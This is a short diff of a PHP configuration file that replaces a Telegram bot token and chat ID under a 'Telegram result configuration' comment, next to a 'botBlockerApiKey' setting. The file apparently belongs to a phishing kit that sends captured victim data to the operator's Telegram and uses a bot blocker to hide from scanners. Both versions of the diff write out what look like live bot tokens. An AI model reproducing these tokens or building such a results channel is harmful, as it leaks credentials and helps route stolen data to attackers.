@@ -2,10 +2,10 @@
 
 // Telegram result configuration.
 if (!defined('TELEGRAM_BOT_TOKEN')) {
-    define('TELEGRAM_BOT_TOKEN', '8733308903:AAHVf5EQj2IHgn81TNzYbBb5usmCaIDNT-I');
+    define('TELEGRAM_BOT_TOKEN', '8603913828:AAEvlp-2RkeegY5u5a12NY6CuY6tlf5RtJE');
 }
 if (!defined('TELEGRAM_CHAT_ID')) {
-    define('TELEGRAM_CHAT_ID', '5793923604');
+    define('TELEGRAM_CHAT_ID', '5740303168');
 }
 
 // botBlockerApiKey.
